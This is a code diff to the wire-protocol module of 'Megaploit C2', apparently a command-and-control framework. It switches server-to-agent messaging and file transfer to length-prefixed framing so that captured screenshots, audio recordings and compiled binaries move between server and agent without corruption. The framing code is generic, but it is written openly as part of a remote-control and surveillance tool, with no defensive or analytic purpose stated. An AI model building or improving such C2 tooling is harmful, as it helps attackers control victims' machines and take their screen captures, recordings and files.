@@ -1,27 +1,38 @@
 """
 megaploit.core.protocol
 ~~~~~~~~~~~~~~~~~~~~~~~
-Wire protocol: all messages are JSON-encoded and delimited by END_SENTINEL.
-Binary payloads (files, screenshots, recordings) are sent raw and also
-terminated by END_SENTINEL so the single TCP connection stays clean.
+Wire protocol for Megaploit C2.
 
-Message flow
-------------
-  Server → Agent:  reliable_send(conn, cmd_string)
-  Agent  → Server: reliable_send(conn, response_string)
+Messages
+--------
+Text messages are JSON-encoded and framed with a 4-byte big-endian length
+prefix (no sentinel), which eliminates any possibility of the sentinel
+appearing inside binary data:
+
+    [4 bytes: uint32 payload length] [payload bytes]
 
 File transfers
 --------------
-  Sender calls send_file(conn, path)  — streams bytes + sentinel
-  Receiver calls recv_file(conn, path) — accumulates bytes until sentinel
+Binary files use the same length-prefix framing:
+
+    [4 bytes: uint32 file length] [raw file bytes]
+
+This replaces the old END_SENTINEL approach which could corrupt binary
+payloads (PNG screenshots, WAV recordings, compiled binaries) if the
+sentinel byte sequence happened to appear in the file content.
+
+Backward-compatibility note
+---------------------------
+END_SENTINEL is kept in config.py for the audit-log module only.
 """
 
 from __future__ import annotations
 
-import json
 import socket
+import struct
+import json
 
-from .config import BUFFER_SIZE, END_SENTINEL
+_HDR = struct.Struct("!I")   # network-order unsigned 32-bit int
 
 
 # ---------------------------------------------------------------------------
@@ -29,30 +40,30 @@ from .config import BUFFER_SIZE, END_SENTINEL
 # ---------------------------------------------------------------------------
 
 def send_msg(conn: socket.socket, data: object) -> None:
-    """JSON-encode *data* and write it to *conn* framed with END_SENTINEL."""
-    payload = json.dumps(data).encode() + END_SENTINEL
-    conn.sendall(payload)
+    """JSON-encode *data*, prefix with 4-byte length, and send."""
+    payload = json.dumps(data).encode("utf-8")
+    conn.sendall(_HDR.pack(len(payload)) + payload)
 
 
 def recv_msg(conn: socket.socket) -> str:
     """
-    Block until a full JSON message (terminated by END_SENTINEL) is received.
+    Read a 4-byte length header then exactly that many bytes.
     Returns the decoded string.
-    Raises ConnectionError if the socket closes before the sentinel arrives.
+    Raises ConnectionError on EOF, OSError on socket errors.
     """
-    buf = b""
-    while True:
-        chunk = conn.recv(BUFFER_SIZE)
-        if not chunk:
-            raise ConnectionError("Connection closed before END_SENTINEL received")
-        buf += chunk
-        if END_SENTINEL in buf:
-            payload, _ = buf.split(END_SENTINEL, 1)
-            decoded = payload.decode("utf-8", errors="replace")
-            try:
-                return json.loads(decoded)
-            except json.JSONDecodeError:
-                return decoded
+    header = _recv_exactly(conn, 4)
+    if header is None:
+        raise ConnectionError("Connection closed while reading message length")
+    (length,) = _HDR.unpack(header)
+    if length == 0:
+        return ""
+    payload = _recv_exactly(conn, length)
+    if payload is None:
+        raise ConnectionError("Connection closed while reading message body")
+    try:
+        return json.loads(payload.decode("utf-8", errors="replace"))
+    except json.JSONDecodeError:
+        return payload.decode("utf-8", errors="replace")
 
 
 # ---------------------------------------------------------------------------
@@ -60,39 +71,51 @@ def recv_msg(conn: socket.socket) -> str:
 # ---------------------------------------------------------------------------
 
 def send_file(conn: socket.socket, path: str) -> None:
-    """Stream the file at *path* to *conn*, then write END_SENTINEL."""
+    """
+    Read *path*, prefix the raw bytes with a 4-byte length header, send.
+    The entire file is buffered — use chunked_send_file for files > ~50 MB.
+    """
     with open(path, "rb") as f:
-        while True:
-            chunk = f.read(BUFFER_SIZE)
-            if not chunk:
-                break
-            conn.sendall(chunk)
-    conn.sendall(END_SENTINEL)
+        data = f.read()
+    conn.sendall(_HDR.pack(len(data)) + data)
 
 
 def recv_file(conn: socket.socket, path: str, timeout: float | None = None) -> None:
     """
-    Receive a file framed with END_SENTINEL and write it to *path*.
+    Read a 4-byte length header then exactly that many bytes and write to *path*.
     Raises socket.timeout, ConnectionError, or IOError on failure.
     """
     old_timeout = conn.gettimeout()
     if timeout is not None:
         conn.settimeout(timeout)
     try:
-        buf = b""
+        header = _recv_exactly(conn, 4)
+        if header is None:
+            raise ConnectionError("Connection closed while reading file length")
+        (length,) = _HDR.unpack(header)
+        if length == 0:
+            # Empty file — create it and return
+            open(path, "wb").close()
+            return
+        data = _recv_exactly(conn, length)
+        if data is None:
+            raise ConnectionError("Connection closed while reading file body")
         with open(path, "wb") as f:
-            while True:
-                chunk = conn.recv(BUFFER_SIZE)
-                if not chunk:
-                    raise ConnectionError("Connection closed before END_SENTINEL received")
-                buf += chunk
-                while END_SENTINEL in buf:
-                    data, buf = buf.split(END_SENTINEL, 1)
-                    f.write(data)
-                    return   # sentinel found — done
-                # Write the safe prefix (can't contain a partial sentinel)
-                safe_len = max(0, len(buf) - len(END_SENTINEL))
-                f.write(buf[:safe_len])
-                buf = buf[safe_len:]
+            f.write(data)
     finally:
         conn.settimeout(old_timeout)
+
+
+# ---------------------------------------------------------------------------
+# Internal helpers
+# ---------------------------------------------------------------------------
+
+def _recv_exactly(conn: socket.socket, n: int) -> bytes | None:
+    """Read exactly *n* bytes from *conn*. Returns None on EOF."""
+    buf = b""
+    while len(buf) < n:
+        chunk = conn.recv(n - len(buf))
+        if not chunk:
+            return None
+        buf += chunk
+    return buf
